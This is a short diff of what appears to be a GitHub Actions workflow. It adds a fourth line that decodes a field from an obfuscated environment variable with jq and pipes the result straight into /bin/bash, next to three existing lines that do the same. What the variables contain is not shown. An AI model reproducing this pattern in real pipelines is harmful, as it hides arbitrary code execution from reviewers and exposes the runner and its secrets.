@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$uezr35929" | jq -r .fcpn8608 | /bin/bash
           echo $y0260 | jq -r .mn822 | /bin/bash
           echo $t088 | jq -r .zr9567 | /bin/bash
+          echo $kz9641 | jq -r .u0 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
